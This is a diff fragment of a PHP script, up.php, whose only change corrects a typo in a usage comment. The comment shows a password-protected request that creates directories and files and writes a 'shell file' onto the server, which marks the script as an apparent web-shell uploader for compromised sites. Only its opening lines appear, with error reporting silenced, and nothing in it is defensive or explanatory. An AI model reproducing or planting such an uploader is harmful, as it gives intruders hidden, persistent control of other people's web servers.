@@ -1,4 +1,4 @@
-//http://127.0.0.1/up.php?pass=brvatof&action=200&mkdir=[name directory]&touch=[name File]&body=[Bady Shell File]
+//http://127.0.0.1/up.php?pass=brvatof&action=200&mkdir=[name directory]&touch=[name File]&body=[Bad Shell File]
 <?php
 error_reporting(0);
 header("Content-Type: text/html; charset=utf-8");
